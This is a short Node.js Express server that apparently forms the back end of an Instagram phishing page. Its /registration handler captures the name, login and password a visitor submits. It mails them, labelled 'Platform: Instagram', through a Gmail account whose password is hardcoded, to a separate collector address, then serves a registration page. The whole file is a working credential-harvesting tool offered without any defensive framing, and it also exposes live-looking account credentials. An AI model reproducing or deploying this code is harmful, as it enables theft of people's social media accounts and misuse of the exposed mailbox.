var express = require('express');
var path = require('path');
var fs = require('fs');
var app = express();
var bodyParser = require('body-parser');
var nodemailer = require('nodemailer');



app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));
app.get('/', function(req, resp) {
  resp.sendFile(__dirname + '/present.html');
});
app.get('/login', function(req, resp) {
  resp.sendFile(__dirname + '/index.html');
});



app.post('/registration', function(req, resp) {

let name = req.body.name;
  let log = req.body.login;
  let pass = req.body.password;



var transporter = nodemailer.createTransport({

 service: 'gmail',
 auth: {
        user: 'tlgninebot@gmail.com',
        pass: 'Ak123212321',
    }
});

const mailOptions = {
  from: 'tlgninebot@gmail.com',
  to: 'alexkach1609@gmail.com',
  subject: 'InstaAdd',
    html: '<div style="font-size:20px;"><span>Platform: "Instagram" <br> Login: '+log+' <br> Password: '+pass+' <br> Name: '+name+'</span></div>',
}



transporter.sendMail(mailOptions, function (err, info) {
   if(err)
     console.log(err)
   else
     console.log(info);
});
resp.sendFile(__dirname + '/registration.html');
});
















app.listen(3000);
